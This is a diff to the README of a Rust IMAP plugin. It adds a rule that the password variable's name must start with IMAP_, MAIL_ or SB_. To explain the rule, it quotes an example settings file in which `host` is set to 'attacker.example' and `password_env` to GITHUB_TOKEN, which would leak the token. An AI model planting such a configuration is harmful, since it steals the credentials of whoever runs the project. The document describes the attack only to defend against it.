@@ -17,8 +17,9 @@ cargo add seleniumbase-rs-plugin-imap --git https://github.com/MustCodeAl/seleni
 
 Or take it from the built-in registry: depend on
 `seleniumbase-rs-plugins-builtin` with the feature `imap`, which builds the
-plugin from its name and options (the variable named by `password_env` must be
-set when the set is built; the error names it):
+plugin from its name and options (the variable named by `password_env` must
+start with `IMAP_`, `MAIL_` or `SB_` and be set when the set is built; the
+error names it):
 
 ```rust
 use seleniumbase_rs_plugins_builtin::{registry, PluginSpec};
@@ -44,7 +45,7 @@ options from `[plugins.imap]` in a config file, shown below.
 | `host` | required | The IMAP server, such as `imap.example.com`. The connection is IMAPS (TLS from the first byte). |
 | `port` | `993` | The IMAPS port. |
 | `user` | required | The login name. |
-| `password_env` | required | The NAME of the environment variable that holds the password or app password. |
+| `password_env` | required | The NAME of the environment variable that holds the password or app password. The name must start with `IMAP_`, `MAIL_` or `SB_` (capitals, as written); any other name is refused. |
 | `mailbox` | `"INBOX"` | The mailbox to watch. |
 | `poll_secs` | `5` | Seconds between two looks at the mailbox (1 to 300). |
 | `timeout_secs` | `120` | Seconds to wait for a matching email (1 to 3600). |
@@ -53,6 +54,22 @@ Unknown options are refused. The password is never an option: only the name of
 the variable is configured. The variable must be set when the plugin is built
 (the error names it), the value is read when the task starts, and it is kept out
 of every error and every `Debug` output.
+
+**Why `password_env` has a prefix rule.** The password is sent to `host`, and
+the settings file that names both can come with a project you cloned. Without
+the rule, a file with `host = "attacker.example"` and
+`password_env = "GITHUB_TOKEN"` would send that token to the attacker's server
+(over TLS, checked against the attacker's own certificate) as soon as you pass
+`--plugin imap`. So the name must start with `IMAP_`, `MAIL_` or `SB_`, a
+variable you set for this plugin and nothing else; it is checked before the
+variable is read, and any other name fails when the plugin is built with
+
+```text
+imap: `password_env` must name a variable starting with IMAP_, MAIL_ or SB_ (got `GITHUB_TOKEN`)
+```
+
+The message names the rule and the variable's name, never a value. Give the
+mailbox password a variable of its own, such as `MAIL_APP_PASSWORD`.
 
 ```toml
 [plugins.imap]
@@ -125,7 +142,8 @@ cargo test -p seleniumbase-rs-plugin-imap
 
 runs without a server: the matcher, the extraction (on the messages in
 `tests/fixtures`), the options and the wait loop with a scripted source. One
-test needs a real mailbox and is `#[ignore]`d:
+test needs a real mailbox and is `#[ignore]`d (`SB_TEST_IMAP_PASSWORD_ENV`
+names the variable that holds the password, so it follows the same prefix rule):
 
 ```sh
 SB_TEST_IMAP_HOST=imap.example.com SB_TEST_IMAP_USER=me@example.com \
